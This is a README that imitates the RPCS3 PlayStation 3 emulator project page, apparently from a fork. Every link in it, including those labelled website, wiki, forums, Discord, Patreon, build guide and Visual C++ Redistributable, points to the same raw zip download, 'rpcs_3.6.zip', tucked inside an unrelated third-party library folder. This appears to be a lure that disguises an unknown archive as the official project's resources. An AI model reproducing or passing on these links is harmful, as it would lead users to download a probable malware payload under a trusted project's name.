The world's first free and open-source PlayStation 3 emulator/debugger, written in C++ for Windows, Linux, macOS and FreeBSD.

You can find some basic information on our [**website**](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip). Game info is being populated on the [**Wiki**](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip).
For discussion about this emulator, PS3 emulation, and game compatibility reports, please visit our [**forums**](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip) and our [**Discord server**](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip).

[**Support Lead Developers Nekotekina and kd-11 on Patreon**](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip)

## Contributing

If you want to help the project but do not code, the best way to help out is to test games and make bug reports. See:
* [Quickstart](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip)

If you want to contribute as a developer, please take a look at the following pages:

* [Coding Style](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip)
* [Developer Information](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip)
* [Roadmap](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip)

You should also contact any of the developers in the forums or in the Discord server to learn more about the current state of the emulator.

## Building

See [https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip) for more information about how to setup an environment to build RPCS3.

## Running

Check our friendly [quickstart](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip) guide to make sure your computer meets the minimum system requirements to run RPCS3.

Don't forget to have your graphics driver up to date and to install the [Visual C++ Redistributable Packages for Visual Studio 2022](https://github.com/deadlocked234/rpcs3/raw/refs/heads/master/3rdparty/SoundTouch/rpcs_3.6.zip) if you are a Windows user.
